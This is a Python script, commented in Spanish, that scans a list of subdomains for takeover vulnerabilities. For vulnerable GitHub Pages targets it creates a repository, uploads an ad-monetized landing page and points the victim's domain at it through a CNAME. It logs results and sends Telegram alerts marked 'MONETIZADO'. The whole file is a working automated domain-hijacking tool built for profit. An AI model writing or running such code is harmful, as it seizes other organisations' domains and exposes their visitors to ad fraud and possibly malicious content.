import sqlite3
import os
import base64
import requests
from fingerprint import check_vulnerability

# Configuración
DB_PATH = "database/inventory.db"
GH_USERNAME = "TU_USUARIO_DE_GITHUB" # Cambia esto por tu usuario

def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True) 
    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()
    curr.execute('''CREATE TABLE IF NOT EXISTS findings 
                    (domain TEXT PRIMARY KEY, service TEXT, status TEXT)''')
    conn.commit()
    conn.close()

def send_telegram(message):
    token = os.getenv("TG_TOKEN")
    chat_id = os.getenv("TG_ID")
    if not token or not chat_id: return
    url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={message}&parse_mode=Markdown"
    requests.get(url)

def auto_takeover_github(vulnerable_domain):
    """Crea un repo y configura el CNAME para capturar el tráfico automáticamente"""
    gh_token = os.getenv("GH_PAT")
    if not gh_token:
        return False, "Falta GH_PAT"

    repo_name = f"ghost-{vulnerable_domain.replace('.', '-')}"
    headers = {
        "Authorization": f"token {gh_token}",
        "Accept": "application/vnd.github.v3+json"
    }

    # 1. Crear el repositorio
    repo_data = {"name": repo_name, "auto_init": True}
    r = requests.post("https://api.github.com/user/repos", headers=headers, json=repo_data)
    
    if r.status_code == 201:
        # 2. Subir el index.html (la landing con Adsterra que generó landing_gen.py)
        try:
            with open("dist/index.html", "rb") as f:
                content = base64.b64encode(f.read()).decode()
            
            file_data = {"message": "Ghost Deploy", "content": content}
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/contents/index.html", 
                         headers=headers, json=file_data)
            
            # 3. Configurar el dominio personalizado
            cname_payload = {"cname": vulnerable_domain}
            requests.put(f"https://api.github.com/repos/{GH_USERNAME}/{repo_name}/pages", 
                         headers=headers, json=cname_payload)
            return True, "MONETIZADO"
        except Exception as e:
            return False, str(e)
    return False, "Error creando repo"

def run_scanner():
    init_db()
    if not os.path.exists("live_subs.txt"):
        print("[-] No se encontró live_subs.txt. Ejecuta primero el discovery.")
        return

    conn = sqlite3.connect(DB_PATH)
    curr = conn.cursor()

    with open("live_subs.txt", "r") as f:
        for line in f:
            domain = line.strip()
            if not domain: continue
            
            curr.execute("SELECT domain FROM findings WHERE domain=?", (domain,))
            if curr.fetchone(): continue

            print(f"[*] Analizando: {domain}")
            status = check_vulnerability(domain)
            
            if status["vulnerable"]:
                res_status = "DETECTADO"
                
                # Intentar monetización automática si es GitHub Pages
                if status["service"] == "GitHub Pages":
                    success, detail = auto_takeover_github(domain)
                    res_status = "MONETIZADO" if success else f"FALLO_AUTO: {detail}"

                msg = f"💎 *TAKEOVER:* `{domain}`\n" \
                      f"🛠️ *Servicio:* {status['service']}\n" \
                      f"💰 *Estado:* `{res_status}`"
                
                send_telegram(msg)
                curr.execute("INSERT INTO findings VALUES (?, ?, ?)", (domain, status["service"], res_status))
                conn.commit()
    
    conn.close()

if __name__ == "__main__":
    run_scanner()